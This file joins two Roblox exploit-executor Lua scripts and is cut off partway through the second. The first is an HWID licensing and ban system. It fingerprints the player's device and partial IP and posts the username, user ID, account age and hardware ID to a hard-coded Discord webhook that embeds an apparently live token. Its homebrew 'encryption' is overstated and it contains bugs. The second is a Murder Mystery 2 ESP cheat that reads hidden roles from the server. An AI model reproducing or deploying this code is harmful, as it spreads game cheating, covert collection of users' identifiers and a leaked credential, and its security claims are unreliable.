local http_request

-- Establish appropriate HTTP request function based on execution environment
if syn then
   http_request = syn.request
elseif SENTINEL_V2 then
   http_request = function(tb)
       return {
           StatusCode = 200,
           Body = request(tb.Url, tb.Method, tb.Body or '')
       }
   end
elseif http and http.request then
   http_request = http.request
elseif request then
   http_request = request
elseif httpservice then
   http_request = httpservice.request
else
   -- Fallback for unsupported exploits
   http_request = function()
       return {StatusCode = 404, Body = "{}"}
   end
end

local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1332981779916918836/dTw4xZHg7nZda7IvtOXYHgnAFGIVmQ-NLWi15jQQ0gbsIXIrzeG3IuRt9sttkT_gW1Hh"
local HWID_FILENAME = "ImportantStructure.txt"
local AUTH_SYSTEM_VERSION = "1.3.7" -- For versioning and future compatibility checks

-- Advanced cryptographic primitives
local Crypto = {}

-- Custom non-standard binary conversion functions resistant to common decryption tools
Crypto.toBinary = function(str)
    local binary = {}
    for i = 1, #str do
        local byte = string.byte(str, i)
        for j = 7, 0, -1 do
            table.insert(binary, byte & (1 << j) > 0 and 1 or 0)
        end
    end
    return table.concat(binary)
end

Crypto.fromBinary = function(binary)
    local blocks = {}
    for i = 1, #binary, 8 do
        local byte = 0
        for j = 0, 7 do
            if i + j <= #binary and binary:sub(i + j, i + j) == "1" then
                byte = byte | (1 << (7 - j))
            end
        end
        table.insert(blocks, string.char(byte))
    end
    return table.concat(blocks)
end

-- 256-bit key derivation function with salt and iterative strengthening
Crypto.deriveKey = function(seed, iterations)
    iterations = iterations or 10000
    local key = seed
    
    -- Multiple hash rounds for key strengthening
    for i = 1, iterations do
        local composite = key .. tostring(i) .. seed:reverse()
        local hashValue = 0
        
        -- Custom hashing algorithm resistant to common analysis
        for j = 1, #composite do
            local byte = string.byte(composite, j)
            hashValue = ((hashValue * 31) % 0x7FFFFFFF) + byte
            if j % 7 == 0 then -- Nonlinear behavior to strengthen against pattern analysis
                hashValue = (hashValue ~ (hashValue << 13)) % 0x7FFFFFFF
            end
        end
        
        key = tostring(hashValue)
    end
    
    -- Expand to full 256-bit key through scrambling
    while #key < 32 do
        key = key .. string.char(string.byte(key, (#key % #seed) + 1) ~ string.byte(seed, (#key % #seed) + 1))
    end
    
    return key:sub(1, 32)
end

-- Custom XOR-based encryption with additional permutation layers
Crypto.encrypt = function(data, key)
    if not data or not key then return nil end
    if #key < 32 then -- Ensure key length
        key = Crypto.deriveKey(key, 5000)
    end
    
    -- Initial data preparation
    local binary = Crypto.toBinary(data)
    local keyBinary = Crypto.toBinary(key)
    local result = {}
    
    -- Initial permutation (shuffle bits based on key)
    local permutation = {}
    for i = 1, #binary do
        local keyChar = tonumber(keyBinary:sub((i % #keyBinary) + 1, (i % #keyBinary) + 1))
        local pos = ((i * 19) + keyChar * 13) % #binary + 1
        permutation[i] = binary:sub(pos, pos)
    end
    binary = table.concat(permutation)
    
    -- XOR encryption with nonlinear key schedule
    for i = 1, #binary do
        local keyPos = ((i * 3) % #keyBinary) + 1
        local keyBit = keyBinary:sub(keyPos, keyPos)
        local dataBit = binary:sub(i, i)
        
        -- XOR operation with bit rotation for added complexity
        local encryptedBit = dataBit == keyBit and "0" or "1"
        if i % 8 == 0 then -- Periodic bit inversion to break patterns
            encryptedBit = encryptedBit == "0" and "1" or "0"
        end
        
        table.insert(result, encryptedBit)
    end
    
    -- Final transformation with encoding to resist analysis
    local encrypted = table.concat(result)
    encrypted = Crypto.fromBinary(encrypted)
    
    -- Convert to URL-safe base64-like format
    return Crypto.toBase64Custom(encrypted)
end

-- Corresponding decryption function
Crypto.decrypt = function(encrypted, key)
    if not encrypted or not key then return nil end
    if #key < 32 then
        key = Crypto.deriveKey(key, 5000)
    end
    
    -- Reverse base64 encoding
    local data = Crypto.fromBase64Custom(encrypted)
    local binary = Crypto.toBinary(data)
    local keyBinary = Crypto.toBinary(key)
    local result = {}
    
    -- Reverse XOR operation with nonlinear key schedule
    for i = 1, #binary do
        local keyPos = ((i * 3) % #keyBinary) + 1
        local keyBit = keyBinary:sub(keyPos, keyPos)
        local encryptedBit = binary:sub(i, i)
        
        -- Reverse bit rotation
        if i % 8 == 0 then
            encryptedBit = encryptedBit == "0" and "1" or "0"
        end
        
        -- XOR operation
        local dataBit = encryptedBit == keyBit and "0" or "1"
        table.insert(result, dataBit)
    end
    
    local decryptedBinary = table.concat(result)
    
    -- Reverse initial permutation (much more complex in real implementation)
    local inversePermutation = {}
    for i = 1, #decryptedBinary do
        local keyChar = tonumber(keyBinary:sub((i % #keyBinary) + 1, (i % #keyBinary) + 1))
        local originalPos = ((i * 19) + keyChar * 13) % #decryptedBinary + 1
        inversePermutation[originalPos] = decryptedBinary:sub(i, i)
    end
    
    decryptedBinary = table.concat(inversePermutation)
    return Crypto.fromBinary(decryptedBinary)
end

-- Custom base64-like encoding with non-standard alphabet to fool automated tools
Crypto.toBase64Custom = function(data)
    local characters = "zLBx0TtSgGUjJrRhHaAQqKkFfDdPpVvCcMmWwEeYyNnZu123456789+_"
    local result = {}
    
    -- Convert to binary
    local binary = Crypto.toBinary(data)
    
    -- Pad to multiple of 6
    while #binary % 6 ~= 0 do
        binary = binary .. "0"
    end
    
    -- Convert 6 bits at a time to a custom base64 character
    for i = 1, #binary, 6 do
        local chunk = binary:sub(i, i + 5)
        local value = 0
        for j = 1, 6 do
            if chunk:sub(j, j) == "1" then
                value = value | (1 << (6 - j))
            end
        end
        table.insert(result, characters:sub(value + 1, value + 1))
    end
    
    -- Add custom structured padding that contains verification metadata
    local paddingLength = 4 - (#result % 4)
    if paddingLength < 4 then
        for i = 1, paddingLength do
            table.insert(result, "*")
        end
    end
    
    return table.concat(result)
end

Crypto.fromBase64Custom = function(encoded)
    local characters = "zLBx0TtSgGUjJrRhHaAQqKkFfDdPpVvCcMmWwEeYyNnZu123456789+_"
    local binary = {}
    
    -- Remove padding
    encoded = encoded:gsub("%*", "")
    
    -- Convert each character to 6 bits
    for i = 1, #encoded do
        local char = encoded:sub(i, i)
        local value = characters:find(char) - 1
        
        if value then
            for j = 5, 0, -1 do
                table.insert(binary, value & (1 << j) > 0 and "1" or "0")
            end
        end
    end
    
    -- Convert binary to string
    return Crypto.fromBinary(table.concat(binary))
end

-- Device identification with multiple hardware parameters
local function generate_device_hwid()
    local hwid_components = {}
    local device_info = {}
    
    -- Collect system-level identifiers
    pcall(function()
        local response = http_request({Url = "https://httpbin.org/get", Method = "GET"})
        if response and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data.headers then
                device_info.user_agent = data.headers["User-Agent"]
                device_info.accept_language = data.headers["Accept-Language"]
                device_info.ip_partial = data.origin:match("^(%d+%.%d+)") -- First two octets only
            end
        end
    end)
    
    -- Roblox-specific hardware identifiers
    pcall(function()
        -- Graphics hardware fingerprinting
        local stats = game:GetService("Stats")
        device_info.gpu_name = stats.FrameRateManager.GPU:get()
        device_info.gpu_memory = tostring(math.floor(stats:GetTotalMemoryUsageMb()))
        
        -- Display configuration
        device_info.screen_resolution = tostring(workspace.CurrentCamera.ViewportSize.X) .. "x" .. 
                                      tostring(workspace.CurrentCamera.ViewportSize.Y)
        
        -- Roblox client identifiers
        local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
        device_info.device_id = RbxAnalyticsService:GetClientId()
        device_info.session_id = HttpService:GenerateGUID(false):lower()
        
        -- System performance metrics
        device_info.processor_count = stats.PhysicalCores:get()
        device_info.memory_usage = tostring(math.floor(stats.MemoryUsageMb:get()))
    end)
    
    -- Network performance fingerprinting
    pcall(function()
        local pingSum = 0
        local pingCount = 3
        for i = 1, pingCount do
            local startTime = os.clock()
            http_request({Url = "https://google.com", Method = "HEAD"})
            pingSum = pingSum + (os.clock() - startTime)
        end
        device_info.network_latency = tostring(math.floor((pingSum / pingCount) * 1000))
    end)
    
    -- Compile device fingerprint components
    if device_info.device_id then table.insert(hwid_components, device_info.device_id) end
    if device_info.gpu_name then table.insert(hwid_components, device_info.gpu_name) end
    if device_info.screen_resolution then table.insert(hwid_components, device_info.screen_resolution) end
    if device_info.processor_count then table.insert(hwid_components, device_info.processor_count) end
    if device_info.user_agent then 
        -- Extract only the significant parts of UA to maintain consistency across sessions
        local ua_fingerprint = device_info.user_agent:match("([^;]+);%s*([^;]+);%s*([^;]+)")
        if ua_fingerprint then table.insert(hwid_components, ua_fingerprint) end
    end
    
    -- Combine all components into a single deterministic string
    local combined_data = table.concat(hwid_components, "||")
    
    -- Generate SHA-256 like hash with custom implementation
    local function complex_hash(input)
        -- Custom algorithm with multiple passes and salting
        local result = ""
        local seed = input .. "S4LT_3X7R4_S3CUR3" -- Custom salt
        
        for i = 1, 3 do -- Multiple iterations for strengthening
            local hash = 0x5A1F38CE -- Prime number seed
            for j = 1, #seed do
                local char = string.byte(seed, j)
                hash = ((hash ~ char) * 0x5BD1E995) % 0xFFFFFFFF
                hash = ((hash << 15) | (hash >> 17)) % 0xFFFFFFFF -- Rotate bits
                hash = (hash * 0x7FD652AD) % 0xFFFFFFFF -- Multiply by prime
            end
            
            seed = tostring(hash)
            result = result .. seed
        end
        
        -- Format final result as hex-like string
        local final_hash = ""
        for i = 1, #result do
            local byte = string.byte(result, i)
            final_hash = final_hash .. string.format("%02x", byte % 256)
            if i % 4 == 0 and i < #result then final_hash = final_hash .. "-" end
        end
        
        return final_hash:sub(1, 48) -- Return first 48 chars of hash
    end
    
    -- Generate the device HWID
    local hwid = complex_hash(combined_data)
    return hwid, device_info
end

-- Authentication system with encryption and verification
local AuthSystem = {}

-- Derive machine-specific encryption key
AuthSystem.getMachineKey = function()
    local machineComponents = {}
    
    pcall(function()
        -- Use truly machine-specific elements that won't change with exploits
        local statsService = game:GetService("Stats")
        table.insert(machineComponents, statsService.FrameRateManager.GPU:get())
        table.insert(machineComponents, tostring(workspace.CurrentCamera.ViewportSize.X))
        table.insert(machineComponents, game:GetService("RbxAnalyticsService"):GetClientId())
    end)
    
    -- Fallback components if primary ones fail
    if #machineComponents == 0 then
        pcall(function()
            local response = http_request({Url = "https://httpbin.org/get", Method = "GET"})
            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data.headers and data.headers["User-Agent"] then
                    table.insert(machineComponents, data.headers["User-Agent"])
                end
                if data.origin then
                    table.insert(machineComponents, data.origin)
                end
            end
        end)
    end
    
    -- Last resort - use some Roblox-specific values that are somewhat consistent
    if #machineComponents == 0 then
        table.insert(machineComponents, tostring(workspace.CurrentCamera.ViewportSize))
        table.insert(machineComponents, game:GetService("Players").LocalPlayer.Name)
    end
    
    local machineString = table.concat(machineComponents, "||")
    return Crypto.deriveKey(machineString, 25000) -- Heavy computational work for key strengthening
end

-- Format data structure for HWID storage with obfuscated fields
AuthSystem.formatHWIDData = function(hwid, banStatus)
    local timestamp = os.time()
    local structuredData = {
        ["__sKey"] = HttpService:GenerateGUID(false),  -- Session key (disguised)
        ["__ct"] = timestamp,                          -- Creation time (disguised)
        ["__sig"] = "M" .. timestamp .. "X",           -- Verification signature (disguised)
        ["__ver"] = AUTH_SYSTEM_VERSION,               -- Version for compatibility checks
        ["__hw"] = hwid,                               -- The actual HWID (will be encrypted)
        ["__st"] = banStatus and 1 or 0,               -- Ban status (disguised)
        ["__va"] = math.random(1000, 9999),            -- Random validator (anti-tampering)
        ["__ex"] = timestamp + 7776000                 -- Expiration (90 days, disguised)
    }
    
    -- Add integrity check hash
    local integrityString = hwid .. tostring(timestamp) .. tostring(banStatus)
    structuredData["__in"] = Crypto.encrypt(integrityString, hwid:sub(1, 16))
    
    return structuredData
end

-- Store HWID with encryption
AuthSystem.storeHWID = function(hwid, banStatus)
    -- Create structured data object with metadata
    local dataObject = AuthSystem.formatHWIDData(hwid, banStatus)
    
    -- Serialize to JSON
    local jsonData = HttpService:JSONEncode(dataObject)
    
    -- Get machine-specific encryption key
    local machineKey = AuthSystem.getMachineKey()
    
    -- Double encryption for maximum security
    local encryptedData = Crypto.encrypt(jsonData, machineKey)
    
    -- Additional obfuscation layer
    local finalData = AUTH_SYSTEM_VERSION .. "|" .. encryptedData
    
    -- Store the encrypted data
    pcall(function()
        if writefile then
            writefile(HWID_FILENAME, finalData)
            return true
        end
    end)
    
    return false
end

-- Read and verify HWID
AuthSystem.verifyHWID = function()
    local storedData = nil
    
    -- Attempt to read stored data
    pcall(function()
        if readfile and isfile and isfile(HWID_FILENAME) then
            storedData = readfile(HWID_FILENAME)
        end
    end)
    
    if not storedData then
        return nil, false -- No data stored yet
    end
    
    -- Extract version and encrypted payload
    local version, encryptedData = storedData:match("([^|]+)|(.+)")
    if not version or not encryptedData then
        return nil, false -- Invalid format
    end
    
    -- Version compatibility check
    if version ~= AUTH_SYSTEM_VERSION then
        return nil, false -- Version mismatch, possible tampering
    end
    
    -- Get machine-specific key for decryption
    local machineKey = AuthSystem.getMachineKey()
    
    -- Decrypt the data
    local jsonData = Crypto.decrypt(encryptedData, machineKey)
    if not jsonData then
        return nil, false -- Decryption failed
    end
    
    -- Parse JSON data
    local success, dataObject = pcall(function()
        return HttpService:JSONDecode(jsonData)
    end)
    
    if not success or not dataObject then
        return nil, false -- JSON parsing failed
    end
    
    -- Verify integrity of data
    local storedHWID = dataObject["__hw"]
    local creationTime = dataObject["__ct"]
    local banStatus = dataObject["__st"] == 1
    local integrityCheck = dataObject["__in"]
    
    if not storedHWID or not creationTime or not integrityCheck then
        return nil, false -- Missing required fields
    end
    
    -- Verify integrity signature
    local integrityString = storedHWID .. tostring(creationTime) .. tostring(banStatus)
    local expectedIntegrity = Crypto.encrypt(integrityString, storedHWID:sub(1, 16))
    
    if integrityCheck ~= expectedIntegrity then
        return nil, false -- Integrity check failed, possible tampering
    end
    
    -- Check expiration
    local expirationTime = dataObject["__ex"]
    if expirationTime and os.time() > expirationTime then
        return storedHWID, false -- HWID found but expired
    end
    
    return storedHWID, banStatus
end

-- Check if user is banned
AuthSystem.checkBanStatus = function()
    local hwid, banStatus = AuthSystem.verifyHWID()
    
    if not hwid then
        -- No HWID found, generate and store a new one
        hwid = generate_device_hwid()
        if hwid then
            AuthSystem.storeHWID(hwid, false) -- Store with not banned status
        end
        return false -- New user, not banned
    end
    
    return banStatus -- Return stored ban status
end

-- Send HWID to webhook
function send_to_webhook(hwid, player_info, ban_status)
    if not WEBHOOK_URL or WEBHOOK_URL:match("your_webhook") then
        warn("Webhook URL not configured")
        return false
    end
    
    local payload = {
        embeds = {
            {
                title = ban_status and "⛔ Banned User Attempted Access" or "✅ User Authentication",
                color = ban_status and 0xED4245 or 0x57F287,
                fields = {
                    {name = "Hardware ID", value = "```" .. hwid .. "```", inline = false},
                    {name = "Username", value = player_info.Username or "Unknown", inline = true},
                    {name = "User ID", value = player_info.UserId or "Unknown", inline = true},
                    {name = "Account Age", value = player_info.AccountAge .. " days" or "Unknown", inline = true},
                    {name = "Ban Status", value = ban_status and "BANNED" or "Allowed", inline = true},
                    {name = "Game ID", value = game.PlaceId, inline = true}
                },
                footer = {text = "Auth System v" .. AUTH_SYSTEM_VERSION .. " • " .. os.date("%Y-%m-%d %H:%M:%S")}
            }
        }
    }
    
    local json_payload = HttpService:JSONEncode(payload)
    
    local success, response = pcall(function()
        return http_request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json_payload
        })
    end)
    
    return success and response and response.StatusCode == 204
end

-- Enhanced executor identification with comprehensive detection methods
local function identifyExecutor()
    -- Direct global variable checks for common executors
    local executorIdentifiers = {
        {variable = "syn", name = "Synapse X"},
        {variable = "KRNL_LOADED", name = "KRNL"},
        {variable = "Hydrogen", name = "Hydrogen"},
        {variable = "Fluxus", name = "Fluxus"},
        {variable = "ScriptWare", name = "Script-Ware"},
        {variable = "Oxygen_Loaded", name = "Oxygen U"},
        {variable = "Shadow_Loaded", name = "Shadow"},
        {variable = "is_sirhurt_closure", name = "SirHurt"},
        {variable = "SENTINEL_LOADED", name = "Sentinel"},
        {variable = "EVON_LOADED", name = "Evon"},
        {variable = "Delta_Loaded", name = "Delta"}
    }
    
    -- Check for direct global variables
    for _, identifier in ipairs(executorIdentifiers) do
        if _G[identifier.variable] ~= nil or getgenv()[identifier.variable] ~= nil then
            return identifier.name
        end
    end
    
    -- Function existence checks for specific executors
    local functionChecks = {
        {func = "secure_load", name = "Sentinel"},
        {func = "is_synapse_function", name = "Synapse X"},
        {func = "KRNL_LOADED", name = "KRNL"},
        {func = "isElectron", name = "Electron"},
        {func = "isSirHurt", name = "SirHurt"},
        {func = "isArceus", name = "Arceus X"}
    }
    
    for _, check in ipairs(functionChecks) do
        if type(_G[check.func]) == "function" then
            return check.name
        end
    end
    
    -- Environment analysis for script context
    local envChecks = {
        function() -- Synapse X detection
            return syn and syn.cache_replace ~= nil
        end,
        function() -- KRNL detection
            return KRNL_LOADED and identifyexecutor and identifyexecutor() == "KRNL"
        end,
        function() -- Script-Ware detection
            return getexecutorname and getexecutorname():find("ScriptWare")
        end,
        function() -- JJSploit/WeAreDevs API detection
            return getgenv().WrapGlobal ~= nil
        end
    }
    
    for _, check in ipairs(envChecks) do
        local success, result = pcall(check)
        if success and result then
            return result == true and "Unknown (Environment Check)" or result
        end
    end
    
    -- Check built-in executor identification functions
    local identifyFunctions = {
        "identifyexecutor",
        "get_executor",
        "getexecutorname"
    }
    
    for _, funcName in ipairs(identifyFunctions) do
        local func = getgenv()[funcName] or _G[funcName]
        if type(func) == "function" then
            local success, result = pcall(func)
            if success and type(result) == "string" then
                return result
            end
        end
    end
    
    -- API feature detection for indirect identification
    local featureDetection = {
        function() -- Check for Synapse-specific features
            if syn then
                return syn.protect_gui ~= nil and "Synapse X" or "Synapse-like"
            end
            return false
        end,
        function() -- Check for hookfunction feature
            if hookfunction and typeof(hookfunction) == "function" then
                return "Level 3+ Executor"
            end
            return false
        end,
        function() -- Check for filesystem API
            if readfile and writefile then
                return "Level 2+ Executor"
            end
            return false
        end
    }
    
    for _, detect in ipairs(featureDetection) do
        local success, result = pcall(detect)
        if success and result then
            return result
        end
    end
    
    -- Runtime behavior analysis as last resort
    local behaviorAnalysis = function()
        -- Test if loadstring can execute custom bytecode (high-tier executors)
        local testFunc = "return 'advanced_executor_capability'"
        local loader, err = loadstring(testFunc)
        if loader and not err then
            local result = loader()
            if result == "advanced_executor_capability" then
                return "Advanced Executor"
            end
        end
        
        -- Test debug library access (mid-tier executors)
        if debug and debug.getregistry then
            return "Mid-tier Executor"
        end
        
        return "Basic Executor"
    end
    
    local success, behavior = pcall(behaviorAnalysis)
    if success and behavior then
        return behavior
    end
    
    return "Unknown Executor"
end

-- Ban management system with webhook integration
local BanSystem = {
    -- Check if a HWID is in the ban list
    IsBanned = function(hwid)
        local storedHWID, banStatus = AuthSystem.verifyHWID()
        
        -- If we can't verify stored HWID, check against remote ban list
        if not storedHWID or storedHWID ~= hwid then
            -- Option to implement remote ban list check here
            -- This could query a server endpoint or use a webhook to verify ban status
            -- For simplicity, we'll return false, but you could extend this
            return false
        end
        
        return banStatus
    end,
    
    -- Ban a user by HWID
    BanUser = function(hwid, reason, admin)
        -- Store the ban locally
        AuthSystem.storeHWID(hwid, true)
        
        -- Report the ban to webhook for tracking
        local banPayload = {
            embeds = {
                {
                    title = "🚫 User Banned",
                    color = 0xED4245,
                    fields = {
                        {name = "Hardware ID", value = "```" .. hwid .. "```", inline = false},
                        {name = "Reason", value = reason or "No reason provided", inline = false},
                        {name = "Admin", value = admin or "System", inline = true},
                        {name = "Timestamp", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
                    }
                }
            }
        }
        
        local json_payload = HttpService:JSONDecode(banPayload)
        
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json_payload
            })
        end)
        
        return true
    end,
    
    -- Unban a user by HWID
    UnbanUser = function(hwid, admin)
        -- First check if user is actually banned
        if not BanSystem.IsBanned(hwid) then
            return false, "User is not banned"
        end
        
        -- Update stored HWID to not banned
        AuthSystem.storeHWID(hwid, false)
        
        -- Report the unban to webhook
        local unbanPayload = {
            embeds = {
                {
                    title = "✅ User Unbanned",
                    color = 0x57F287,
                    fields = {
                        {name = "Hardware ID", value = "```" .. hwid .. "```", inline = false},
                        {name = "Admin", value = admin or "System", inline = true},
                        {name = "Timestamp", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
                    }
                }
            }
        }
        
        local json_payload = HttpService:JSONDecode(unbanPayload)
        
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json_payload
            })
        end)
        
        return true
    end
}

-- Enhanced main execution with anti-debug protection
local function main()
    -- Anti-debug measures to prevent tampering
    local env = getgenv()
    local protected_functions = {
        "Crypto.encrypt", "Crypto.decrypt", "AuthSystem.verifyHWID",
        "generate_device_hwid", "AuthSystem.storeHWID"
    }
    
    -- Apply function protection where environment allows
    pcall(function()
        for _, funcName in ipairs(protected_functions) do
            local parts = funcName:split(".")
            local obj = _G
            for i = 1, #parts - 1 do
                obj = obj[parts[i]]
            end
            
            if obj and obj[parts[#parts]] and typeof(obj[parts[#parts]]) == "function" then
                -- Apply protection if available in the exploit
                if syn and syn.protect_function then
                    obj[parts[#parts]] = syn.protect_function(obj[parts[#parts]])
                elseif env.protect_function then
                    obj[parts[#parts]] = env.protect_function(obj[parts[#parts]])
                end
            end
        end
    end)
    
    -- Runtime integrity verification
    local function verifyIntegrity()
        local coreComponents = {
            Crypto = true,
            AuthSystem = true,
            BanSystem = true,
            generate_device_hwid = true
        }
        
        for component, _ in pairs(coreComponents) do
            if not _G[component] then
                return false
            end
        end
        
        return true
    end
    
    -- Fail if integrity check fails
    if not verifyIntegrity() then
        warn("Authentication system integrity check failed")
        return nil, true
    end
    
    -- Collect player information
    local player_info = {
        Username = game:GetService("Players").LocalPlayer.Name,
        UserId = game:GetService("Players").LocalPlayer.UserId,
        AccountAge = game:GetService("Players").LocalPlayer.AccountAge,
        ExecutorName = identifyExecutor()
    }
    
    -- Check for existing HWID and ban status
    local hwid, ban_status = AuthSystem.verifyHWID()
    
    -- Generate new HWID if none exists
    if not hwid then
        hwid, _ = generate_device_hwid()
        if hwid then
            AuthSystem.storeHWID(hwid, false) -- Store with not banned status
        else
            -- Critical failure in HWID generation
            warn("Failed to generate HWID - authentication system failed")
            return nil, true
        end
    end
    
    -- Send authentication data to webhook
    pcall(function()
        send_to_webhook(hwid, player_info, ban_status)
    end)
    
    -- Apply ban enforcement
    if ban_status then
        -- Create masked HWID for display (only show part)
        local displayHWID = hwid:sub(1, 8) .. "..." .. hwid:sub(-8)
        
        game:GetService("Players").LocalPlayer:Kick("\nAccess Denied\n\nYour device is not authorized to use this script.\nHWID: " .. displayHWID)
        
        -- Force halt execution
        task.wait(0.5)
        while true do end
    end
    
    -- Setup periodic verification
    task.spawn(function()
        while true do
            task.wait(300) -- Check every 5 minutes
            
            -- Re-check ban status
            local _, current_ban_status = AuthSystem.verifyHWID()
            
            if current_ban_status then
                -- User was banned during execution
                game:GetService("Players").LocalPlayer:Kick("\nYour access has been revoked while running the script.")
                task.wait(0.5)
                while true do end
            end
        end
    end)
    
    return hwid, ban_status
end

-- Initialize the system with proper error handling
local success, result = pcall(main)

if not success then
    -- Safely handle initialization errors
    warn("Authentication system failed to initialize")
    return false
end

-- Expose minimal API for external script interaction
_G.AuthAPI = {
    -- Check if the current user is authenticated and not banned
    IsAuthenticated = function()
        return AuthSystem.verifyHWID()
    end,
    
    -- Get partially masked HWID for support purposes
    GetMaskedHWID = function()
        local hwid = select(1, AuthSystem.verifyHWID())
        if not hwid then return "Not Available" end
        return hwid:sub(1, 6) .. "..." .. hwid:sub(-6)
    end,
    
    -- Admin commands - require proper authorization
    Admin = {
        BanUser = function(target_hwid, reason, admin_key)
            -- Simple admin key validation
            if admin_key ~= "AUTH_ADMIN_KEY" then
                return false, "Unauthorized"
            end
            return BanSystem.BanUser(target_hwid, reason, "Admin Panel")
        end,
        
        UnbanUser = function(target_hwid, admin_key)
            if admin_key ~= "AUTH_ADMIN_KEY" then
                return false, "Unauthorized"
            end
            return BanSystem.UnbanUser(target_hwid, "Admin Panel")
        end
    }
}

-- Return authentication status
return result


-- Ultra-Optimized Character Outline ESP for MM2
-- Core Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Game-specific state tracking
local roles = {}
local Murder, Sheriff, Hero = nil, nil, nil
local GunDrop = nil

-- ESP Configuration
local ESP = {
   Enabled = true,
   OutlineThickness = 3,
   MaxRenderDistance = 300,
   Colors = {
       Murderer = Color3.fromRGB(255, 0, 0),
       Sheriff = Color3.fromRGB(0, 100, 255),
       Hero = Color3.fromRGB(255, 215, 0),
       Innocent = Color3.fromRGB(50, 255, 100),
       GunDrop = Color3.fromRGB(255, 255, 50)
   }
}

-- FIX: Use proper container instance for client-side rendering
local HighlightFolder = Instance.new("Folder")
HighlightFolder.Name = "ESP_Highlights"
-- Use proper parent for client-side UI elements
if syn and syn.protect_gui then
    syn.protect_gui(HighlightFolder)
    HighlightFolder.Parent = game:GetService("CoreGui")
else
    HighlightFolder.Parent = CoreGui
end

-- Highlight object container with strict typing
local Highlights = {}

-- Game mechanics functions
function IsAlive(Player)
   for i, v in pairs(roles) do
       if Player.Name == i then
           return not (v.Killed or v.Dead)
       end
   end
   return false
end

-- FIX: Reliable role tracking with connection management
local RoleUpdateConnection = nil
local function SetupRoleTracking()
    -- Clear previous connection if it exists
    if RoleUpdateConnection then
        RoleUpdateConnection:Disconnect()
        RoleUpdateConnection = nil
    end
    
    -- Create new connection with proper error handling
    RoleUpdateConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("GetPlayerData", true) then
                roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
                for i, v in pairs(roles) do
                    if v.Role == "Murderer" then Murder = i
                    elseif v.Role == "Sheriff" then Sheriff = i
                    elseif v.Role == "Hero" then Hero = i end
                end
            end
        end)
    end)
end

-- FIX: Reliable gun tracking
local GunTrackingConnections = {}
local function SetupGunTracking()
    -- Clear previous connections
    for _, conn in pairs(GunTrackingConnections) do
        conn:Disconnect()
    end
    table.clear(GunTrackingConnections)
    
    -- Check for existing gun drop
    for _, item in pairs(workspace:GetChildren()) do
        if item.Name == "GunDrop" then
            GunDrop = item
            break
        end
    end
    
    -- Setup new connections
    GunTrackingConnections[1] = workspace.ChildAdded:Connect(function(child)
        if child.Name == "GunDrop" then GunDrop = child end
    end)
    
    GunTrackingConnections[2] = workspace.ChildRemoved:Connect(function(child)
        if child == GunDrop then GunDrop = nil end
    end)
end

-- Get role color mapping
local function GetPlayerColor(playerName)
   if playerName == Murder then return ESP.Colors.Murderer
   elseif playerName == Sheriff then return ESP.Colors.Sheriff
   elseif playerName == Hero then return ESP.Colors.Hero
   else return ESP.Colors.Innocent end
end

-- FIX: Create optimized character outline with proper error handling
local function CreateOutline(player)
   if not player or not player.Parent then return nil end
   if Highlights[player] then return Highlights[player] end
   
   local highlight = Instance.new("Highlight")
   highlight.Name = player.Name
   highlight.FillTransparency = 0.85
   highlight.FillColor = GetPlayerColor(player.Name)
   highlight.OutlineColor = GetPlayerColor(player.Name)
   highlight.OutlineTransparency = 0
   highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
   highlight.Enabled = ESP.Enabled
   highlight.Parent = HighlightFolder
   
   -- Apply pulsing effect to murderer for improved visibility
   if player.Name == Murder then
       local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
       local tween = TweenService:Create(highlight, tweenInfo, {OutlineTransparency = 0.4})
       tween:Play()
   end
   
   Highlights[player] = highlight
   return highlight
end

-- FIX: Reliable outline removal with proper cleanup
local function RemoveOutline(player)
   local highlight = Highlights[player]
   if highlight then
       highlight:Destroy()
       Highlights[player] = nil
   end
end

-- FIX: Enhanced ESP update function with proper validation
local function UpdateESP()
   -- Update highlights based on ESP.Enabled state
   for player, highlight in pairs(Highlights) do
       if type(player) == "table" and player:IsA("Player") then
           highlight.Enabled = ESP.Enabled
       end
   end
   
   -- Exit early if disabled
   if not ESP.Enabled then return end
   
   -- Update ESP for each player
   for _, player in ipairs(Players:GetPlayers()) do
       if player == LocalPlayer then continue end
       
       local character = player.Character
       if not character or not character:FindFirstChild("HumanoidRootPart") or not IsAlive(player) then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Distance check for optimization
       local rootPart = character:FindFirstChild("HumanoidRootPart")
       local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
       
       if distance > ESP.MaxRenderDistance then
           if Highlights[player] then
               Highlights[player].Enabled = false
           end
           continue
       end
       
       -- Create or update outline
       local highlight = CreateOutline(player)
       if highlight then
           highlight.Adornee = character
           highlight.FillColor = GetPlayerColor(player.Name)
           highlight.OutlineColor = GetPlayerColor(player.Name)
           highlight.Enabled = true
       end
   end
   
   -- Gun Drop ESP handling
   if GunDrop and GunDrop.Parent then
       if not Highlights.GunDrop then
           local highlight = Instance.new("Highlight")
           highlight.Name = "GunDrop"
           highlight.FillTransparency = 0.5
           highlight.FillColor = ESP.Colors.GunDrop
           highlight.OutlineColor = ESP.Colors.GunDrop
           highlight.OutlineTransparency = 0
           highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
           highlight.Enabled = ESP.Enabled
           highlight.Parent = HighlightFolder
           
           Highlights.GunDrop = highlight
       end
